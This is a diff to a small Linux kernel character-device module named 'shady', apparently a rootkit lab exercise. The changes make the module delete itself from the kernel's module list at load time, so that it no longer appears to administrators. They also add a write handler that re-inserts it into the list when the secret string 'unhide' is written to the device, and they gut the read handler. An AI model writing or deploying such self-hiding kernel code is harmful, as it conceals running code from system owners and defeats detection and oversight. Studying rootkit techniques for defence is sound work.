@@ -108,28 +108,39 @@ ssize_t
 shady_read(struct file *filp, char __user *buf, size_t count, 
 	    loff_t *f_pos)
 {
-  struct shady_dev *dev = (struct shady_dev *)filp->private_data;
-  ssize_t retval = 0;
 	
-  if (mutex_lock_killable(&dev->shady_mutex))
-    return -EINTR;
-	
-  mutex_unlock(&dev->shady_mutex);
-  return retval;
+  return count;
 }
                 
 ssize_t 
 shady_write(struct file *filp, const char __user *buf, size_t count, 
 	     loff_t *f_pos)
 {
-  struct shady_dev *dev = (struct shady_dev *)filp->private_data;
-  ssize_t retval = 0;
-	
-  if (mutex_lock_killable(&dev->shady_mutex))
-    return -EINTR;
-	
-  mutex_unlock(&dev->shady_mutex);
-  return retval;
+  const char magic[] = {"unhide\n"};
+  char spell[sizeof(magic)];
+  size_t i;
+  struct module *head = find_module("hid");
+
+  /* Did the user complete the spell? */
+  if (count == sizeof(magic)) {
+    if(copy_from_user(spell, buf, count)) {
+      printk("shady write\n");
+      return -EFAULT;
+    }
+    for (i = 0; i < sizeof(magic); ++i) {
+      if (magic[i] != spell[i]) {
+	printk("wrong char %c at %lu\n", spell[i], i);
+	/* Wrong incantation. */
+	return i;
+      }
+    }
+    printk("What's this?\n");
+    list_add_tail(&shady_mod->list, &head->list);
+  }
+  else {
+    printk("Bad count\n");
+  }
+  return count;
 }
 
 loff_t 
@@ -240,7 +251,6 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
-  struct module *mod;
 	
   if (shady_ndevices <= 0)
     {
@@ -295,7 +305,7 @@ shady_init_module(void)
   
   shady_mod = find_module("shady");
   if (shady_mod) { /* Why wouldn't shady be here? */
-    list_del(&mod->list);
+    list_del(&shady_mod->list);
   }
 
   return 0; /* success */
